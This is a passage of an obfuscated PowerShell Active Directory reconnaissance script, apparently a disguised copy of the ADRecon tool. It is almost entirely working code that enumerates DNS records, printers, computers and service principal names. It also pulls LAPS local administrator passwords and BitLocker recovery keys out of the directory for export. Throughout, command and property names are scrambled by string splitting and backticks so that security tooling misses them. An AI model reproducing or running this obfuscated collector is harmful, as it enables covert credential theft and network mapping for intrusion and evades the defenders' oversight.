                        ${ObJ`NoDe} | &("{0}{2}{1}" -f 'Add','ber','-Mem') -MemberType ("{2}{1}{0}{3}"-f 'ePro','ot','N','perty') -Name ("{1}{0}{2}" -f 'h','w','enChanged') -Value ([DateTime] $(${_}."PR`oPe`RtIes"."WhE`NC`HANGed"))
                        
                        
                        
                        ${ObJNO`dE} | &("{1}{0}{2}"-f 'Membe','Add-','r') -MemberType ("{2}{1}{0}" -f 'ty','Proper','Note') -Name ("{1}{4}{3}{2}{0}"-f 'iewOnly','sh','nAdvancedV','I','ow') -Value ([string] $(${_}."PR`oPERTI`ES"."S`How`ina`DvA`NCedvI`EWO`NLy"))
                        ${o`BJnoDe} | &("{2}{1}{0}" -f'ber','d-Mem','Ad') -MemberType ("{1}{2}{0}{3}"-f'p','N','otePro','erty') -Name ("{3}{2}{1}{0}"-f 'edName','guish','istin','D') -Value ([string] $(${_}."Pr`oP`erties"."dIStin`g`U`IS`HEDnaMe"))
                        ${addn`Sno`D`ESObJ} += ${ObJn`oDE}
                        If (${dNSreC`o`Rd})
                        {
                            &("{2}{0}{1}{3}" -f'ove-Var','iab','Rem','le') ("{2}{0}{1}"-f 'NSR','ecord','D')
                        }
                    }
                }
                Else
                {
                    ${O`BJ} | &("{0}{1}{2}"-f 'Ad','d-Memb','er') -MemberType ("{0}{3}{1}{2}"-f 'NotePr','r','ty','ope') -Name ("{1}{2}{0}"-f'ordCount','Re','c') -Value ${n`ULL}
                }
                ${O`BJ} | &("{2}{0}{1}"-f '-Memb','er','Add') -MemberType ("{0}{2}{1}" -f'No','erty','teProp') -Name ("{0}{3}{1}{2}" -f'U','a','ted','SNCre') -Value ([string] $(${_}."pr`opE`RTIEs"."Us`NCR`EatED"))
                ${O`BJ} | &("{2}{1}{0}"-f'Member','d-','Ad') -MemberType ("{0}{1}{3}{2}"-f 'Note','Prope','y','rt') -Name ("{0}{2}{1}"-f 'U','ed','SNChang') -Value ([string] $(${_}."ProP`ER`TieS"."USnCha`N`gEd"))
                ${O`BJ} | &("{0}{3}{2}{1}" -f 'Ad','r','embe','d-M') -MemberType ("{0}{1}{2}"-f'No','tePr','operty') -Name ("{1}{2}{0}"-f'ted','whenC','rea') -Value ([DateTime] $(${_}."prop`ER`TIEs"."wH`e`NCrEa`Ted"))
                ${o`Bj} | &("{1}{2}{0}" -f 'Member','A','dd-') -MemberType ("{2}{0}{1}" -f 'otePrope','rty','N') -Name ("{1}{0}{2}" -f'Chang','when','ed') -Value ([DateTime] $(${_}."pRO`p`Er`Ties"."w`HeNc`h`AnGeD"))
                ${o`Bj} | &("{1}{2}{3}{0}" -f'mber','Ad','d','-Me') -MemberType ("{0}{2}{1}"-f'NoteProp','ty','er') -Name ("{5}{1}{2}{4}{3}{0}"-f'edName','sti','ngu','h','is','Di') -Value ([string] $(${_}."PRO`PERT`iEs"."dIstI`NGu`is`H`EDna`Me"))
                ${Addns`Z`O`N`EsoBJ} += ${O`BJ}
            }
            &("{2}{3}{1}{0}" -f'Verbose','e-','Wr','it') "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            &("{2}{3}{0}{4}{1}" -f 'e-','iable','R','emov','Var') ("{2}{3}{0}{1}" -f 'eAr','ray','DNSZo','n')
        }
    }

    If (${a`dd`NsZo`NE`SoBj} -and ${ad`RDn`SZO`NEs})
    {
        &("{1}{2}{3}{0}" -f 'R','Ex','p','ort-AD') ${a`d`DNSzONE`sOBJ} ${ADRo`U`TpuTD`Ir} ${O`U`TPuT`TyPE} ("{0}{2}{1}" -f'DNSZ','nes','o')
        &("{3}{4}{2}{1}{0}"-f 'e','ariabl','e-V','Rem','ov') ("{1}{0}{2}" -f'Zon','ADDNS','esObj')
    }

    If (${ADD`Ns`NOdEs`o`Bj} -and ${A`Dr`DnsrEc`o`RdS})
    {
        &("{1}{3}{0}{2}"-f 'ort-AD','Ex','R','p') ${A`dDNs`NoD`EsOBJ} ${adro`U`TPuT`Dir} ${o`U`TPUtT`YPe} ("{0}{1}{2}" -f 'DNSN','o','des')
        &("{4}{0}{2}{3}{1}"-f 'v','e','e-','Variabl','Remo') ("{0}{1}{2}" -f 'ADD','NSNod','esObj')
    }
}

Function ge`T-A`DRPRi`NT`er
{


    param(
        [Parameter(MANDAtOrY = ${t`RUe})]
        [string] ${met`hOD},

        [Parameter(ManDAToRY = ${F`ALSE})]
        [DirectoryServices.DirectoryEntry] ${o`Bjdo`mAIn},

        [Parameter(MAnDAtorY = ${Tr`Ue})]
        [int] ${pag`E`sizE},

        [Parameter(mandatory = ${FA`LSe})]
        [int] ${ThRe`A`Ds} = 10
    )

    If (${M`eT`hod} -eq ("{0}{1}"-f 'AD','WS'))
    {
        Try
        {
            ${ad`P`Ri`NTErs} = @( &("{0}{2}{1}"-f 'G','t','et-ADObjec') -LDAPFilter ("{0}{5}{3}{2}{7}{6}{1}{4}" -f'(o','ue','e','at','ue)','bjectC','tQ','gory=prin') -Properties ("{1}{2}{0}" -f'Name','drive','r'),("{0}{3}{2}{1}" -f 'driv','ion','Vers','er'),("{0}{1}" -f'Na','me'),("{1}{0}" -f 'ortName','p'),("{3}{2}{0}{4}{1}"-f'r','e','intSha','pr','eNam'),("{2}{3}{0}{1}"-f'erNam','e','s','erv'),("{1}{0}" -f'rl','u'),("{1}{2}{3}{0}"-f 'hanged','wh','e','nC'),("{0}{2}{1}{3}" -f'whenC','eat','r','ed') )
        }
        Catch
        {
            &("{1}{0}{2}{3}" -f'e-War','Writ','nin','g') ("{8}{12}{0}{2}{10}{11}{9}{3}{5}{6}{4}{7}{1}"-f 'ADRPrinte','Objects','r] Error while e','r','u','int','Que','e ','[Get','p','numerat','ing ','-')
            &("{1}{2}{3}{0}" -f'se','Wr','i','te-Verbo') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`ll}
        }

        If (${Ad`pRin`TERs})
        {
            &("{1}{2}{0}" -f'ose','Write-Ver','b') "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            ${PRi`N`TErs`obj} =  (get-cHilDitem  varIaBle:It3V9e ).VAluE::("{0}{1}{2}" -f 'Printer','Par','ser').Invoke(${adPRiN`TE`RS}, ${T`h`ReAdS})
            &("{1}{3}{0}{2}"-f 'ab','Remo','le','ve-Vari') ("{1}{2}{0}"-f'ters','ADPri','n')
        }
    }

    If (${mEt`H`od} -eq ("{0}{1}" -f'L','DAP'))
    {
        ${ObjSEA`Rc`her} = &("{2}{0}{1}"-f'w-O','bject','Ne') ("{12}{9}{0}{4}{6}{5}{7}{3}{1}{10}{8}{11}{2}" -f'r','es.','r','ervic','e','ory','ct','S','ctor','tem.Di','Dire','ySearche','Sys') ${o`BjDO`maIN}
        ${Ob`Js`eARcH`ER}."PAge`si`zE" = ${pa`g`e`SIZe}
        ${ObJ`SE`ARch`eR}."f`ilteR" = (("{6}{4}{0}{2}{5}{3}{1}"-f 'ctCatego',')','ry','eue','e','=printQu','(obj'))
        ${o`B`jSE`ARcHeR}."sE`Arc`H`sCope" = ("{0}{1}"-f 'Subtre','e')

        Try
        {
            ${AD`pR`in`Ters} = ${ObJ`sEarC`Her}.("{1}{2}{0}" -f'll','F','indA').Invoke()
        }
        Catch
        {
            &("{1}{2}{3}{0}"-f 'g','Write-War','n','in') ("{8}{5}{3}{7}{11}{10}{12}{0}{1}{2}{4}{6}{9}"-f'or while enumerating ','pr','intQ','ADRP','ueue ','Get-','Object','rin','[','s',' E','ter]','rr')
            &("{1}{0}{2}" -f 'bo','Write-Ver','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULL}
        }
        ${O`B`J`SeArChER}.("{1}{0}{2}" -f'sp','di','ose').Invoke()

        If (${adPr`in`TE`Rs})
        {
            ${C`Nt} = $( $D761P::("{2}{0}{1}{3}" -f 'b','jectC','O','ount').Invoke(${ADp`Ri`NTERs}))
            If (${c`Nt} -ge 1)
            {
                &("{0}{4}{3}{1}{2}"-f'W','e-Verbo','se','t','ri') ('['+'*] '+'T'+'ota'+'l '+'Pri'+'nte'+'rs'+': '+"$cnt")
                ${PRI`NTerS`oBJ} =  ( gEt-IteM ('V'+'ARi'+'AbL'+'e:D7'+'61P')  ).VaLuE::("{3}{0}{2}{1}" -f 'e','er','rPars','Print').Invoke(${a`dpri`NTeRS}, ${Th`RE`Ads})
            }
            &("{0}{1}{2}{3}{4}" -f 'Remove-V','a','ri','ab','le') ("{1}{0}{3}{2}"-f'DPrint','A','rs','e')
        }
    }

    If (${PRInT`Ers`OBJ})
    {
        Return ${priNte`Rs`OBJ}
    }
    Else
    {
        Return ${NU`lL}
    }
}

Function GET-A`D`RcoMpuT`ER
{

    param(
        [Parameter(mAndATory = ${TR`Ue})]
        [string] ${meT`HOd},

        [Parameter(maNdATory = ${t`RUE})]
        [DateTime] ${d`ATE},

        [Parameter(MAnDatORY = ${Fa`LSe})]
        [DirectoryServices.DirectoryEntry] ${oBjDom`A`iN},

        [Parameter(MANDAtORY = ${T`Rue})]
        [int] ${Do`RMant`TI`MesP`An} = 90,

        [Parameter(MAnDAtORY = ${t`RUe})]
        [int] ${paSsmA`Xa`gE} = 30,

        [Parameter(mandatoRY = ${t`RuE})]
        [int] ${pAg`ESi`ze},

        [Parameter(MAnDatorY = ${Fa`Lse})]
        [int] ${tHre`A`Ds} = 10,

        [Parameter(MAnDATorY = ${F`AlSe})]
        [int] ${ADRcOm`PUTe`RS} = ${TR`UE},

        [Parameter(MaNdatOry = ${fA`Lse})]
        [int] ${a`Drco`mPUt`erS`pns} = ${fa`lsE}
    )

    If (${M`ETHoD} -eq ("{0}{1}"-f 'AD','WS'))
    {
        If (!${Ad`RComP`Ut`ErS})
        {
            Try
            {
                ${ADC`OmpU`TeRS} = @( &("{0}{3}{1}{2}" -f'Get','je','ct','-ADOb') -LDAPFilter (("{3}{6}{14}{2}{0}{7}{8}{11}{5}{4}{13}{9}{10}{1}{12}"-f 'AccountType','*','m','(','cip','cePrin','&','=','80530','me','=','6369)(servi','))','alNa','(sa')) -ResultPageSize ${P`AgeS`IZe} -Properties ("{1}{0}"-f'e','Nam'),("{3}{4}{1}{5}{2}{0}"-f 'alName','n','p','service','Pri','ci') )
            }
            Catch
            {
                &("{3}{1}{2}{0}" -f 'ng','-Wa','rni','Write') ("{10}{1}{5}{11}{8}{0}{3}{4}{2}{9}{6}{12}{7}{13}"-f 'ter] E','A','um','rror while',' en','D','ing Com','ct','mpu','erat','[Get-','RCo','puterSPN Obje','s')
                &("{3}{4}{1}{0}{2}"-f 'r','Ve','bose','Wri','te-') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`Ll}
            }
        }
        Else
        {
            Try
            {
                ${AD`compu`TE`Rs} = @( &("{2}{1}{0}{3}"-f'A','et-','G','DComputer') -Filter * -ResultPageSize ${PAgE`S`i`ZE} -Properties ("{2}{3}{1}{0}"-f 'ion','ipt','Desc','r'),("{1}{0}{2}{3}"-f'g','Distin','uishedNa','me'),("{2}{0}{3}{1}" -f'NS','stName','D','Ho'),("{1}{2}{0}" -f'd','Enab','le'),("{2}{1}{0}"-f'ress','v4Add','IP'),("{1}{2}{0}" -f 'te','La','stLogonDa'),("{6}{7}{2}{5}{4}{0}{1}{3}" -f't','e','e','To','ga','dToDele','msDS-All','ow'),("{3}{0}{2}{1}" -f 's','id','-CreatorS','ms-d'),("{4}{3}{2}{1}{5}{6}{0}{7}"-f 'y','ted','por','S-Sup','msD','En','cryptionT','pes'),("{0}{1}"-f'Nam','e'),("{2}{0}{1}{3}"-f 'gS','yst','Operatin','em'),("{1}{0}{2}{4}{3}"-f'era','Op','tingSyste','tfix','mHo'),("{0}{1}{3}{5}{6}{2}{4}"-f 'Ope','r','c','atingS','k','ystemServiceP','a'),("{4}{2}{1}{0}{3}{5}" -f 'ing','erat','p','SystemVersio','O','n'),("{1}{3}{2}{0}{4}"-f'a','P','L','assword','stSet'),("{3}{2}{0}{1}"-f 'ry','GroupID','ma','pri'),("{1}{3}{2}{0}" -f 'Name','S','ount','amAcc'),("{1}{3}{4}{0}{2}"-f 'a','servicePrin','lName','ci','p'),("{0}{1}"-f 'SI','D'),("{2}{0}{3}{1}" -f 'DHi','ory','SI','st'),("{2}{3}{4}{0}{1}"-f'gati','on','Trus','ted','ForDele'),("{2}{6}{7}{1}{3}{5}{0}{4}"-f'egat','uthF','T','or','ion','Del','r','ustedToA'),("{2}{4}{0}{1}{3}"-f'Co','ntro','UserAcco','l','unt'),("{0}{3}{1}{2}"-f 'w','enC','hanged','h'),("{0}{1}{2}"-f 'whenC','rea','ted') )
            }
            Catch
            {
                &("{2}{3}{0}{1}"-f'rnin','g','Wr','ite-Wa') ("{11}{5}{4}{2}{10}{7}{0}{3}{9}{1}{8}{6}" -f'num','uter O','] E','erati','mputer','t-ADRCo','cts','e e','bje','ng Comp','rror whil','[Ge')
                &("{2}{1}{0}" -f'erbose','rite-V','W') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`ULL}
            }
        }
        If (${Ad`C`oMp`UTers})
        {
            &("{2}{3}{0}{1}" -f'erbo','se','Write','-V') "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If (${Ad`R`ComP`UtERS})
            {
                ${COmPuT`E`Robj} =   ( vaRIable  ('iT3v9'+'E') -VAl )::("{2}{1}{0}{3}"-f'mpute','o','C','rParser').Invoke(${aDCO`M`pu`TeRS}, ${D`ATE}, ${D`orMaNtt`i`MESp`AN}, ${pA`S`s`maxage}, ${th`R`EADs})
            }
            If (${aD`RComPUteRS`p`Ns})
            {
                ${COm`puT`E`RsPnObJ} =  $IT3V9e::("{0}{4}{3}{2}{1}" -f'Comp','ser','Par','terSPN','u').Invoke(${aDcO`MP`UT`Ers}, ${THrE`A`DS})
            }
            &("{4}{1}{0}{3}{2}" -f'o','em','able','ve-Vari','R') ("{0}{1}{2}"-f'ADCo','mputer','s')
        }
    }

    If (${m`ethoD} -eq ("{1}{0}"-f'AP','LD'))
    {
        If (!${a`dRco`MPU`TerS})
        {
            ${oB`J`SEA`RCher} = &("{0}{2}{1}" -f 'New-','t','Objec') ("{0}{9}{2}{4}{1}{8}{6}{7}{11}{5}{3}{10}" -f 'System.','e','rySe','ar','rvic','e','D','irectory','s.','Directo','cher','S') ${ObJD`o`mA`iN}
            ${O`BjSEaRCh`eR}."PAGE`sI`zE" = ${PA`gEsI`ZE}
            ${o`B`jSEArC`Her}."F`iLteR" = ("{8}{12}{1}{15}{6}{0}{13}{14}{2}{3}{5}{4}{7}{11}{9}{10}" -f 'tType=','(','06369',')(servi','ePrincip','c','mAccoun','alNa','(','e','=*))','m','&','80','53','sa')
            ${oB`jS`E`ARchEr}."pR`OPe`RTIeSt`O`loAd".("{1}{2}{0}" -f'ange','A','ddR').Invoke((("{0}{1}"-f 'n','ame'),("{2}{3}{1}{5}{4}{0}"-f'ipalname','ce','serv','i','inc','pr')))
            ${OB`JSea`RCH`ER}."SEaRC`hS`coPe" = ("{1}{0}" -f 'btree','Su')
            Try
            {
                ${a`DC`oMp`UtERs} = ${ObJ`seArC`H`eR}.("{1}{2}{0}"-f 'l','Find','Al').Invoke()
            }
            Catch
            {
                &("{1}{0}{2}"-f 'te-Warni','Wri','ng') ("{11}{2}{4}{6}{12}{14}{10}{8}{5}{9}{13}{0}{15}{3}{7}{1}"-f 'omp','ects','Get-AD',' ','RCo','n','mputer] Er','Obj','ti','g ',' enumera','[','ror whi','C','le','uterSPN')
                &("{1}{2}{0}"-f'rbose','Write','-Ve') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`UlL}
            }
            ${O`Bj`se`ArchEr}.("{1}{0}" -f 'se','dispo').Invoke()
        }
        Else
        {
            ${oBJ`s`Ea`RcHer} = &("{2}{1}{0}{3}" -f 'bjec','-O','New','t') ("{8}{3}{4}{5}{9}{0}{7}{2}{6}{1}" -f 'rvices','her','e','tem.Dir','ecto','r','arc','.DirectoryS','Sys','ySe') ${O`BJ`d`omaiN}
            ${OBjSE`Ar`CHER}."P`AgE`sIZE" = ${P`AG`esizE}
            ${Obj`seAr`c`HER}."F`i`LTEr" = ("{2}{4}{0}{1}{3}"-f 'ntType=','8053063','(sa','69)','mAccou')
            ${OBj`SEa`RchEr}."P`Ro`Pe`RTIeSt`Oload".("{0}{1}{2}" -f'AddR','a','nge').Invoke((("{0}{1}{2}{3}" -f 'd','escrip','tio','n'),("{4}{1}{0}{3}{2}"-f 'ting','is','e','uishednam','d'),("{2}{1}{0}" -f 'ame','stn','dnsho'),("{3}{0}{2}{1}"-f 'time','amp','st','lastlogon'),("{1}{2}{5}{3}{4}{0}" -f'To','ms','DS','lowedT','oDelegate','-Al'),("{0}{2}{3}{1}" -f'ms-','rSid','ds-Cre','ato'),("{5}{4}{3}{1}{2}{0}"-f 's','pt','ionType','ncry','SupportedE','msDS-'),("{1}{0}" -f 'ame','n'),("{0}{1}{2}" -f 'obj','ec','tsid'),("{3}{1}{0}{2}" -f 'gsy','n','stem','operati'),("{0}{3}{1}{5}{4}{2}{6}"-f'oper','ho','i','atingsystem','f','t','x'),("{4}{1}{3}{6}{5}{2}{0}"-f'epack','ingsy','c','stems','operat','rvi','e'),("{5}{2}{1}{4}{3}{0}"-f 'rsion','n','erati','systemve','g','op'),("{0}{3}{1}{2}"-f'pri','o','upid','marygr'),("{2}{1}{0}"-f'set','t','pwdlas'),("{1}{0}{2}{3}"-f 'm','sa','ac','countname'),("{2}{3}{5}{4}{1}{0}" -f 'me','ipalna','ser','vice','rinc','p'),("{2}{3}{0}{1}"-f'dhist','ory','s','i'),("{5}{0}{4}{3}{1}{2}"-f'er','t','rol','on','accountc','us'),("{0}{2}{1}" -f 'when','d','change'),("{2}{1}{3}{0}" -f'ted','nc','whe','rea')))
            ${OB`JS`EArchEr}."Sea`RcHSCO`pe" = ("{1}{2}{0}"-f'ree','Sub','t')

            Try
            {
                ${adC`oMP`Ut`ERS} = ${oBJse`Arch`er}.("{1}{0}" -f 'All','Find').Invoke()
            }
            Catch
            {
                &("{0}{1}{2}" -f'Write-','Warn','ing') ("{5}{6}{1}{3}{9}{15}{12}{8}{13}{11}{0}{2}{16}{4}{14}{10}{7}" -f 'numeratin','et','g Computer O','-ADR','j','[','G','ts','or w','Compu','c',' e','Err','hile','e','ter] ','b')
                &("{1}{0}{3}{2}"-f'r','W','bose','ite-Ver') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nU`lL}
            }
            ${O`BJsEaRCh`ER}.("{0}{1}{2}" -f'dispo','s','e').Invoke()
        }

        If (${aD`coMp`UTe`RS})
        {
            &("{0}{1}{2}" -f 'Write-','Ver','bose') "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If (${adrCO`MP`UTerS})
            {
                ${cOMputE`Ro`BJ} =  $d761p::("{2}{0}{1}"-f'uter','Parser','Comp').Invoke(${aDCo`mP`UTERs}, ${D`ATe}, ${DOr`M`A`NttiMES`PAn}, ${p`AssMa`xaGe}, ${T`h`ReADS})
            }
            If (${aDrc`omp`U`Ters`P`Ns})
            {
                ${c`oMpUTe`RSP`N`ObJ} =   (  VaRiABLe d761P  -vALUEO )::("{2}{5}{0}{4}{3}{1}" -f'terSPN','r','Co','se','Par','mpu').Invoke(${AdCOmP`U`T`eRs}, ${t`HR`EAdS})
            }
            &("{3}{0}{2}{4}{1}"-f'ove-V','le','ar','Rem','iab') ("{0}{2}{1}{3}" -f 'A','r','DCompute','s')
        }
    }

    If (${com`putero`Bj})
    {
        &("{0}{2}{1}" -f 'E','ADR','xport-') -ADRObj ${c`o`MPu`TeROBJ} -ADROutputDir ${aDr`oUTpU`Td`IR} -OutputType ${O`UtPUTT`yPe} -ADRModuleName ("{2}{1}{3}{0}"-f's','mpute','Co','r')
        &("{3}{1}{2}{0}" -f 'ble','emove-Var','ia','R') ("{1}{2}{0}" -f'bj','Compu','terO')
    }
    If (${c`OmPU`TEr`S`pNoBj})
    {
        &("{2}{0}{1}"-f'rt-A','DR','Expo') -ADRObj ${coMpUter`s`PNO`Bj} -ADROutputDir ${A`d`Ro`UTPUtdir} -OutputType ${o`Ut`puTT`ype} -ADRModuleName ("{0}{3}{1}{2}" -f'Com','SPN','s','puter')
        &("{3}{4}{2}{0}{1}"-f'-Var','iable','ve','Re','mo') ("{2}{0}{3}{1}{4}"-f 'pute','S','Com','r','PNObj')
    }
}


Function gE`T-Adrl`ApS`cHe`ck
{

    param(
        [Parameter(manDATorY = ${t`Rue})]
        [string] ${M`eThOd},

        [Parameter(mANdAToRy = ${Fa`L`SE})]
        [DirectoryServices.DirectoryEntry] ${oB`JdoMa`IN},

        [Parameter(mANDaToRY = ${T`Rue})]
        [int] ${pAG`Esi`ZE},

        [Parameter(MAndAtorY = ${f`AlSE})]
        [int] ${tHR`e`AdS} = 10
    )

    If (${me`ThOD} -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            ${AD`CoMpUT`ERS} = @( &("{2}{1}{0}"-f't-ADObject','e','G') -LDAPFilter (("{4}{3}{1}{0}{2}" -f '53','untType=80','06369)','co','(samAc')) -Properties ('CN'),("{2}{1}{3}{0}" -f 'e','tNa','DNSHos','m'),("{0}{3}{1}{2}"-f 'ms-Mcs-A','mP','wd','d'),("{6}{5}{2}{3}{4}{7}{0}{8}{1}" -f'pirat','ime','-Mcs-A','d','mPwdE','s','m','x','ionT') -ResultPageSize ${pAG`eS`ize} )
        }
        Catch [System.ArgumentException]
        {
            &("{3}{1}{2}{0}" -f 'ng','rite-War','ni','W') ("{1}{4}{0}{5}{2}{6}{3}"-f ' LAPS i','[*','l','d.',']','s not imp','emente')
            Return ${N`UlL}
        }
        Catch
        {
            &("{0}{1}{2}"-f'Write-W','ar','ning') ("{5}{13}{1}{12}{8}{11}{0}{3}{4}{2}{10}{9}{6}{7}"-f' ','RLA','enumerati','whi','le ','[G','ct','s','SCheck] Er',' LAPS Obje','ng','ror','P','et-AD')
            &("{1}{0}{2}{3}" -f'Ver','Write-','bo','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`lL}
        }

        If (${ADCo`mpu`TerS})
        {
            &("{4}{1}{3}{0}{2}" -f 'bo','ri','se','te-Ver','W') "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            ${L`APsoBJ} =   $It3v9e::("{0}{1}{2}" -f 'LAPSP','ar','ser').Invoke(${AD`C`OMpUT`Ers}, ${T`hRE`ADS})
            &("{1}{0}{2}{3}{4}" -f'-','Remove','Va','ri','able') ("{1}{0}{2}{3}"-f'te','ADCompu','r','s')
        }
    }

    If (${Met`hOd} -eq ("{0}{1}" -f 'L','DAP'))
    {
        ${o`BjSe`Arch`eR} = &("{2}{0}{1}" -f 'Objec','t','New-') ("{9}{6}{2}{4}{5}{8}{1}{0}{10}{3}{7}" -f '.Di','ices','o','r','r','ySer','ystem.Direct','cher','v','S','rectorySea') ${O`BjdomA`IN}
        ${O`BJSEar`cH`ER}."p`A`GESiZe" = ${pA`ge`siZe}
        ${o`BJ`s`EaRchER}."FI`lter" = (("{2}{4}{3}{6}{5}{1}{0}" -f '306369)','05','(s','Accoun','am','e=8','tTyp'))
        ${OBJs`E`ArCHer}."PRoPe`R`Ti`eSTO`LOad".("{1}{0}"-f'Range','Add').Invoke(("cn",("{2}{1}{0}" -f 'e','am','dnshostn'),("{3}{1}{2}{0}{4}" -f 'a','m','cs-','ms-','dmpwd'),("{3}{0}{5}{4}{6}{2}{1}" -f 's','iontime','pirat','m','dmpwd','-mcs-a','ex')))
        ${obJ`S`eArc`her}."sE`Ar`Ch`SCope" = ("{2}{1}{0}"-f'ee','tr','Sub')
        Try
        {
            ${A`DcoMPu`TeRS} = ${ObJ`SEA`RCher}.("{0}{1}" -f 'Fin','dAll').Invoke()
        }
        Catch
        {
            &("{2}{0}{1}"-f 'Warni','ng','Write-') ("{8}{11}{5}{0}{13}{1}{9}{10}{7}{6}{12}{2}{3}{4}" -f'ile','ratin','c','t','s','wh','APS ','L','[G','g',' ','et-ADRLAPSCheck] Error ','Obje',' enume')
            &("{2}{0}{1}"-f 'V','erbose','Write-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`LL}
        }
        ${objsea`R`ChER}.("{2}{0}{1}" -f'spo','se','di').Invoke()

        If (${AD`cO`MpUterS})
        {
            ${La`PSC`Heck} =   (geT-cHiLDiteM  ("vArI"+"a"+"BLe:D"+"76"+"1P") ).VALUe::("{2}{1}{0}"-f 'ck','Che','LAPS').Invoke(${a`dcOmP`Ut`eRS})
            If (-Not ${laP`Sc`HECk})
            {
                &("{0}{3}{2}{1}"-f'Wri','ing','n','te-War') ("{1}{0}{6}{3}{2}{5}{4}" -f'A','[*] L',' imple','not','d.','mente','PS is ')
                Return ${N`ULl}
            }
            Else
            {
                &("{0}{1}{2}" -f'Write-Ve','r','bose') "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
                ${la`p`SoBJ} =   (  ls VarIable:d761P ).VALUe::("{2}{1}{0}" -f 'r','rse','LAPSPa').Invoke(${a`dC`oMPUtErS}, ${th`R`eaDs})
                &("{2}{3}{0}{4}{1}"-f 'ri','le','Remo','ve-Va','ab') ("{0}{2}{1}"-f 'ADComp','rs','ute')
            }
        }
    }

    If (${LAp`so`Bj})
    {
        Return ${l`APs`Obj}
    }
    Else
    {
        Return ${NU`lL}
    }
}

Function g`et`-AdRBIT`lOckER
{

    param(
        [Parameter(MaNDaTOry = ${t`RUE})]
        [string] ${MeT`hOd},

        [Parameter(mAndaTORY = ${F`ALSE})]
        [DirectoryServices.DirectoryEntry] ${Ob`jd`omaiN},

        [Parameter(mandatORY = ${fal`se})]
        [string] ${d`om`AInCoNTR`oLlEr},

        [Parameter(maNDaTorY = ${fA`l`se})]
        [Management.Automation.PSCredential] ${crED`en`Ti`Al} =   (  GeT-cHiLdiTEm  ('v'+'arIab'+'lE:'+'nk5P')  ).VAluE::"eM`pTy"
    )

    If (${meT`HoD} -eq ("{1}{0}" -f 'WS','AD'))
    {
        Try
        {
            ${AdBItL`Oc`kEr`RecOv`E`RyKEYs} = &("{2}{1}{0}"-f 'ject','-ADOb','Get') -LDAPFilter (("{8}{10}{2}{9}{4}{3}{7}{1}{5}{0}{6}"-f 'fo','R','je','lass=m','C','ecoveryIn','rmation)','sFVE-','(o','ct','b')) -Properties ("{0}{2}{4}{3}{1}"-f'dis','ame','tingu','hedN','is'),("{1}{6}{2}{3}{5}{0}{4}" -f'swo','msF','v','e','rd','ryPas','VE-Reco'),("{0}{2}{4}{1}{3}"-f'm','r','sFVE-','yGuid','Recove'),("{2}{0}{3}{4}{1}" -f's','d','m','FVE','-VolumeGui'),("{1}{0}" -f 'me','Na'),("{1}{2}{0}"-f 'eated','w','henCr')
        }
        Catch
        {
            &("{1}{3}{4}{2}{0}"-f'ing','Wr','n','ite-W','ar') ("{10}{7}{1}{11}{0}{9}{3}{8}{2}{5}{6}{4}"-f 'er] Err','AD','Ob','-RecoveryIn','cts','j','e','-','formation ','or while enumerating msFVE','[Get','RBitLock')
            &("{2}{4}{3}{0}{1}" -f'-Ve','rbose','W','te','ri') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`Ll}
        }

        If (${AdBI`TLo`ckeR`RECo`VEry`kE`ys})
        {
            ${c`Nt} = $(  (vAriAbLE it3v9E).Value::("{2}{0}{1}" -f'e','ctCount','Obj').Invoke(${aD`BiTl`O`ckErrEcOvE`RyK`E`yS}))
            If (${C`Nt} -ge 1)
            {
                &("{0}{2}{3}{1}" -f 'Wri','erbose','te-','V') ('[*]'+' '+'Tota'+'l'+' '+'Bi'+'tL'+'ocker '+'Rec'+'ov'+'ery '+'K'+'eys:'+' '+"$cnt")
                ${B`itLOcK`ERo`Bj} = @()
                ${a`dBitL`o`CKE`RRECOV`ERYkEYs} | &("{1}{4}{2}{0}{3}" -f'bjec','ForE','-O','t','ach') {
                    
                    ${O`BJ} = &("{2}{0}{1}" -f 'ew-Obje','ct','N') ("{0}{1}"-f'PSObje','ct')
                    ${O`BJ} | &("{2}{1}{0}" -f 'ember','d-M','Ad') -MemberType ("{0}{1}{2}" -f'No','t','eProperty') -Name ("{2}{0}{3}{1}" -f 'ingu','ame','Dist','ished N') -Value $(((${_}."dI`s`TINGUis`hEdnaMe" -split '}')[1]).("{2}{3}{1}{0}"-f'ing','r','su','bst').Invoke(1))
                    ${O`Bj} | &("{2}{1}{0}"-f'r','e','Add-Memb') -MemberType ("{1}{3}{2}{0}"-f'y','N','rt','otePrope') -Name ("{0}{1}"-f 'Nam','e') -Value ${_}."n`AmE"
                    ${O`BJ} | &("{1}{2}{0}" -f'er','Add-Mem','b') -MemberType ("{0}{2}{3}{1}" -f'Not','erty','eP','rop') -Name ("{0}{1}{2}"-f'when','Cre','ated') -Value ${_}."w`h`EncREated"
                    ${o`Bj} | &("{1}{2}{0}"-f '-Member','Ad','d') -MemberType ("{0}{2}{3}{1}" -f'NotePrope','y','r','t') -Name ("{1}{0}{2}" -f'ry K','Recove','ey ID') -Value $([GUID] ${_}.'msFVE-RecoveryGuid')
                    ${o`BJ} | &("{1}{0}{2}" -f'Memb','Add-','er') -MemberType ("{2}{0}{3}{1}"-f'te','erty','No','Prop') -Name ("{0}{3}{1}{2}" -f'R','y',' Key','ecover') -Value ${_}.'msFVE-RecoveryPassword'
                    ${o`BJ} | &("{0}{2}{1}"-f'Add-','ber','Mem') -MemberType ("{0}{2}{1}" -f'Not','perty','ePro') -Name ("{1}{0}{2}" -f'e GU','Volum','ID') -Value $([GUID] ${_}.'msFVE-VolumeGuid')
                    Try
                    {
